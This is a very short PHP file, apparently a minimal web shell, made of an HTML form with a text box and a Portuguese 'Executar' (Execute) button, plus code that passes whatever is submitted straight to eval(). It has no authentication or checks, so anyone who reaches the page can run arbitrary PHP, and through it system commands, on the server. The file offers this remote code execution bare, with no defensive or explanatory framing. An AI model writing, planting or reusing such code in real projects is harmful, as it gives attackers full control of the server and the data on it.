<form method="POST">
    <textarea name="code"></textarea><br/>
    <input type="submit" value="Executar"/>
</form>
<?php
if(!empty($_POST['code'])){
    eval($_POST['code']);
}

?>